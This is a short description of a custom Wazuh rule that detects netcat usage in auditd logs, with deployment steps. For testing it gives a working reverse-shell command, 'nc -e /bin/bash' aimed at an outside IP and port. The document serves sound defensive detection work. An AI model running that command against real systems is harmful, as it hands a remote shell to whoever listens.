# Wazuh Custom Detection Rules Description

## Rule: Suspicious Command Detection - Netcat Usage

### Overview

This custom rule is designed to detect suspicious execution of the `netcat` (`nc`) command, which attackers often use for reverse shells or file transfers. The rule monitors auditd logs for commands containing `nc`.

### Rule Details

- Rule ID: 100101  
- Severity Level: 10 (High)  
- Detection Frequency: Once per hour (3600 seconds timeframe)  
- Log Source: auditd logs (`/var/log/audit/audit.log`)  
- Rule Group: auditd, suspicious_commands  
- MITRE ATT&CK Technique: T1059 - Command and Scripting Interpreter  

### Deployment Instructions

1. Copy `custom-rules.xml` to the Wazuh manager’s rules directory:

```bash
sudo cp custom-rules.xml /var/ossec/etc/rules/custom-rules.xml
```
```bash
sudo systemctl restart wazuh-manager
```
Generate test events by running suspicious commands such as:
```bash
nc -e /bin/bash 192.168.1.100 4444
```
Verify alerts in the Wazuh dashboard under Security Events → Rules → search for Rule ID 100101.

This detection improves your SOC's ability to identify attacker lateral movement and data exfiltration techniques using netcat.
